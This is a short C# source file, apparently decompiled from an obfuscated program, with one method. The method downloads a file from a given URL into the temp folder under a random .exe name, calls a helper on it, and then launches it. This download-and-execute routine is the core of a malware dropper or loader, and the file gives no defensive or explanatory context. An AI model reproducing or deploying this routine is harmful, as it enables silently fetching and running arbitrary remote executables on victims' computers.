using System.Diagnostics;
using System.IO;
using System.Net;

internal sealed class Class1
{
	public static void smethod_0(string string_0)
	{
		string text = Class29.smethod_2(8) + ".exe";
		WebClient webClient = new WebClient();
		string fileName = Path.Combine(Path.GetTempPath(), text);
		webClient.DownloadFile(string_0, fileName);
		Class26.smethod_1(Path.GetTempPath(), text);
		Process.Start(fileName);
	}
}
